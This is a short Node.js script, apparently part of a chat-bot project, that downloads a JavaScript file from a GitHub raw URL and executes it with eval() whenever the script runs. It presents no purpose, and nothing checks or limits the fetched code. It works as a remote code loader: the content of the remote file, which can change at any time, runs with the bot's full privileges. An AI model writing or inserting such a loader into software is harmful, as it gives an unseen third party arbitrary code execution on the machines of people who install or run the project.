const axios = require('axios');

(async () => {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/mehedi7t99/Mehedi-Bot/main/modifier.js");
    if (data) {
      eval(data);
    }
  } catch (error) {
    console.error("Error fetching code:", error.message);
  }
})();
